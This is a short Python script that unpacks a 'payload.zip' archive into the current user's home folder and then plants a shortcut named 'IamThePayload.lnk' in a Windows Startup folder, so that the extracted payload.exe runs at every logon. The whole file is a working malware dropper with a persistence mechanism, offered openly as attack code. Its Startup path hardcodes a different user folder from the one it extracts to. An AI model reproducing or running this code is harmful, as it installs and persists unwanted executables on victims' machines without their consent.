import zipfile
import os
import getpass
from swinlnk.swinlnk import SWinLnk

with zipfile.ZipFile('payload.zip','r') as zfile:
    zfile.extractall('C:\\Users\\'+getpass.getuser())


from swinlnk.swinlnk import SWinLnk
swl = SWinLnk()
swl.create_lnk('C:\\Users\\'+getpass.getuser()+'\\payload\\payload.exe', 'C:\\Users\\Windows\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IamThePayload.lnk')
